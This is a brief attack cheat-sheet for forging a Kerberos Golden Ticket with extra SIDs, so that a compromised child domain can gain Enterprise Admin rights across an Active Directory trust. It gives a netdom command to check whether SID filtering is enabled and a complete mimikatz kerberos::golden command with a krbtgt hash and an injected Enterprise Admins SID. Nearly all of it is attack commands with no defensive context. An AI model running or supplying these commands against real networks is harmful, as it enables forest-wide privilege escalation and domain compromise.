# Golden Ticket Extra SID
## Check SID Filtering
```
netdom trust example.com /domain:admin.example.com /quarantine
```
## Create Golden Ticket
```
kerberos::golden /user:pwn /domain:example.com /sid:S-1-5-21-2032401531-514583578-4118854891 /krbtgt:7c1865e6e30e54e8845aad091b0ff441 /sids:S-1-5-21-1135011135-3178090508-3111492220-519 /ticket:administrator.kirbi
```
